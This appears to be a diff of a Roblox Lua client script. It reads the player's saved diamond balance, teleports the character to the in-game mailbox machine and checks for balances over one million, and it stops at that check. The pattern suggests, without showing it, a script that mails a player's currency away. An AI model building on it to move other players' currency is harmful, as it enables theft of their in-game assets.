@@ -1,6 +1,7 @@
 local rs = game.ReplicatedStorage
 local numsho = require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)
-local library = require(rs:WaitForChild("Library"))
+local save_cmd = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+local getdata = save_cmd.Get
 local curcheck = function(a)
     local value = 0
     for i,v in pairs(a) do
@@ -19,8 +20,8 @@ local curid = function(a)
     end
     return value
 end
-local diamonds = curcheck(library.Save.Get().Inventory.Currency)
-local diamid = curid(library.Save.Get().Inventory.Currency)
+local diamonds = curcheck(getdata().Inventory.Currency)
+local diamid = curid(getdata().Inventory.Currency)
 game.Players.LocalPlayer.Character:PivotTo(game:GetService("Workspace").TradingPlaza.INTERACT.Machines.MailboxMachine.Arrow.CFrame + Vector3.new(0,4,0))
 wait(.5)
 if diamonds ~= 0 and diamonds > 1000000 and diamid ~= nil then
